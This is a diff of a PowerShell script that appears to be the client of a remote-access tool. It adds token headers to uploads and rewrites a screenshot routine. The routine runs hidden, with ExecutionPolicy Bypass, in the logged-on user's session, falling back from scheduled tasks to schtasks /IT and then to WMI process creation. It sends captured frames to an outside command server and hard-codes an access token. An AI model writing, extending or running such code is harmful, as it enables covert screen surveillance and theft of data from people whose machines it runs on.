@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.2.6"
+$Version = "3.2.7"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -1367,6 +1367,7 @@ function Report([string]`$msg) {
     try {
         `$wc = New-Object System.Net.WebClient
         `$wc.Headers.Add('User-Agent','Mozilla/5.0')
+        `$wc.Headers.Add('X-Token','$cfToken')
         `$wc.UploadData('$cfHost/result?id=$clientId','POST',[System.Text.Encoding]::UTF8.GetBytes(`$msg)) | Out-Null
         `$wc.Dispose()
     } catch {}
@@ -1375,6 +1376,7 @@ function UploadFrame([byte[]]`$data) {
     `$r = [System.Net.HttpWebRequest]::Create('$cfHost/capture_frame?id=$clientId')
     `$r.Method='POST'; `$r.ContentType='image/jpeg'; `$r.ContentLength=`$data.Length
     `$r.Timeout=15000; `$r.ReadWriteTimeout=15000; `$r.UserAgent='Mozilla/5.0'
+    `$r.Headers.Add('X-Token','$cfToken')
     `$s = `$r.GetRequestStream(); `$s.Write(`$data,0,`$data.Length); `$s.Close()
     `$r.GetResponse().Close()
 }
@@ -1399,47 +1401,98 @@ try {
 }
 "@
                             [System.IO.File]::WriteAllText($capScript, $capCode, [System.Text.Encoding]::UTF8)
-                            $capAction    = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
-                                                -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$capScript`""
-                            $capPrincipal = New-ScheduledTaskPrincipal -UserId $loggedOnUser -LogonType Interactive
-                            $capSettings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-                            Register-ScheduledTask -TaskName $capTaskId -Action $capAction -Principal $capPrincipal -Settings $capSettings -Force | Out-Null
-                            Start-ScheduledTask -TaskName $capTaskId
-                            # Track in script scope so Stop-CameraStream/trap can kill it if we crash mid-wait
-                            $script:captureTaskId     = $capTaskId
-                            $script:captureScriptPath = $capScript
-                            $script:captureOutPath    = $capOut
-                            $script:captureErrPath    = $capErr
-                            Write-Log "Capture task started: $capTaskId as $loggedOnUser" "INFO"
-                            # Wait up to 40s — VMs need extra time for interactive desktop binding
-                            $deadline = (Get-Date).AddSeconds(40)
-                            while ((Get-Date) -lt $deadline) {
-                                if (Test-Path $capOut) { break }
-                                if (Test-Path $capErr) { break }
-                                Start-Sleep -Milliseconds 400
+
+                            # Helper: poll for capOut/capErr up to $waitSec seconds
+                            function Wait-CaptureOutput([int]$waitSec) {
+                                $dl = (Get-Date).AddSeconds($waitSec)
+                                while ((Get-Date) -lt $dl) {
+                                    if (Test-Path $capOut) { return 'out' }
+                                    if (Test-Path $capErr) { return 'err' }
+                                    Start-Sleep -Milliseconds 400
+                                }
+                                return 'timeout'
                             }
-                            # Cleanup task and script-scope tracking
-                            try { Stop-ScheduledTask      -TaskName $capTaskId -ErrorAction SilentlyContinue } catch {}
+
+                            $captureSucceeded = $false
+
+                            # ── Method 1: PowerShell scheduled task API (Interactive logon) ──
+                            try {
+                                $capAction    = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
+                                                    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$capScript`""
+                                $capPrincipal = New-ScheduledTaskPrincipal -UserId $loggedOnUser -LogonType Interactive
+                                $capSettings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+                                Register-ScheduledTask -TaskName $capTaskId -Action $capAction -Principal $capPrincipal -Settings $capSettings -Force | Out-Null
+                                Start-ScheduledTask -TaskName $capTaskId
+                                $script:captureTaskId = $capTaskId; $script:captureScriptPath = $capScript
+                                $script:captureOutPath = $capOut; $script:captureErrPath = $capErr
+                                Write-Log "Capture method1 (PS task) started: $capTaskId as $loggedOnUser" "INFO"
+                                # Give task 2s to transition out of Ready state before polling
+                                Start-Sleep -Seconds 2
+                                $w1 = Wait-CaptureOutput 35
+                                if ($w1 -ne 'timeout') { $captureSucceeded = $true }
+                            } catch {
+                                Write-Log "Capture method1 failed: $($_.Exception.Message)" "WARN"
+                            }
+                            try { Stop-ScheduledTask -TaskName $capTaskId -ErrorAction SilentlyContinue } catch {}
                             try { Unregister-ScheduledTask -TaskName $capTaskId -Confirm:$false -ErrorAction SilentlyContinue } catch {}
+                            $script:captureTaskId = $null
+
+                            # ── Method 2: schtasks.exe CLI with /IT flag ─────────────────────
+                            if (-not $captureSucceeded -and -not (Test-Path $capOut) -and -not (Test-Path $capErr)) {
+                                Write-Log "Capture trying method2 (schtasks /IT)" "INFO"
+                                try {
+                                    $psArg  = "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$capScript`""
+                                    $stProc = Start-Process 'schtasks.exe' -ArgumentList "/Create /F /TN `"$capTaskId`" /TR `"PowerShell.exe $psArg`" /SC ONCE /ST 00:00 /RU `"$loggedOnUser`" /IT" -Wait -NoNewWindow -PassThru
+                                    if ($stProc.ExitCode -eq 0) {
+                                        Start-Process 'schtasks.exe' -ArgumentList "/Run /TN `"$capTaskId`"" -Wait -NoNewWindow | Out-Null
+                                        $script:captureTaskId = $capTaskId
+                                        Write-Log "Capture method2 (schtasks /IT) started" "INFO"
+                                        Start-Sleep -Seconds 2
+                                        $w2 = Wait-CaptureOutput 35
+                                        if ($w2 -ne 'timeout') { $captureSucceeded = $true }
+                                    }
+                                } catch {
+                                    Write-Log "Capture method2 failed: $($_.Exception.Message)" "WARN"
+                                }
+                                try { & schtasks.exe /Delete /TN "$capTaskId" /F 2>$null } catch {}
+                                $script:captureTaskId = $null
+                            }
+
+                            # ── Method 3: WMI Win32_Process.Create ───────────────────────────
+                            if (-not $captureSucceeded -and -not (Test-Path $capOut) -and -not (Test-Path $capErr)) {
+                                Write-Log "Capture trying method3 (WMI Win32_Process)" "INFO"
+                                try {
+                                    $wmiCmd = "PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$capScript`""
+                                    $wmiRes = ([wmiclass]"\\\\`.\root\cimv2:Win32_Process").Create($wmiCmd)
+                                    if ($wmiRes.ReturnValue -eq 0) {
+                                        Write-Log "Capture method3 (WMI) PID=$($wmiRes.ProcessId)" "INFO"
+                                        $w3 = Wait-CaptureOutput 35
+                                        if ($w3 -ne 'timeout') { $captureSucceeded = $true }
+                                    } else {
+                                        Write-Log "Capture method3 WMI ReturnValue=$($wmiRes.ReturnValue)" "WARN"
+                                    }
+                                } catch {
+                                    Write-Log "Capture method3 failed: $($_.Exception.Message)" "WARN"
+                                }
+                            }
+
+                            # ── Cleanup and final report ─────────────────────────────────────
                             try { Remove-Item $capScript -Force -ErrorAction SilentlyContinue } catch {}
-                            # Clear script-scope refs — task is done
-                            $script:captureTaskId = $null; $script:captureScriptPath = $null; $script:captureOutPath = $null; $script:captureErrPath = $null
+                            $script:captureScriptPath = $null; $script:captureOutPath = $null; $script:captureErrPath = $null
+
                             if (Test-Path $capErr) {
                                 $errTxt = [System.IO.File]::ReadAllText($capErr).Trim()
                                 try { Remove-Item $capErr -Force -ErrorAction SilentlyContinue } catch {}
-                                throw $errTxt   # Report() already sent to server; just propagate
+                                throw $errTxt
                             }
                             if (Test-Path $capOut) {
-                                # Task uploaded directly to /capture_frame — just notify the operator
                                 try { Remove-Item $capOut -Force -ErrorAction SilentlyContinue } catch {}
                                 Send-Result-To-Server -Body "[+] Screenshot captured. View at: $cfHost/capture_view?id=$clientId`n"
                                 Start-Sleep -Milliseconds $activeDelay
                                 continue
                             }
-                            # Neither file appeared — task never ran
-                            $lastResult = -1
-                            try { $lastResult = (Get-ScheduledTaskInfo -TaskName $capTaskId -ErrorAction SilentlyContinue).LastTaskResult } catch {}
-                            throw "Screenshot task did not run (taskState=Ready, lastTaskResult=$lastResult, user=$loggedOnUser). Interactive session may not be available."
+                            # All 3 methods exhausted
+                            throw "Screenshot task did not run after 3 methods (PS task, schtasks /IT, WMI). Is an interactive session active for $loggedOnUser?"
                         } else {
                             # --- Non-SYSTEM path: capture directly ---
                             Add-Type -AssemblyName System.Windows.Forms, System.Drawing
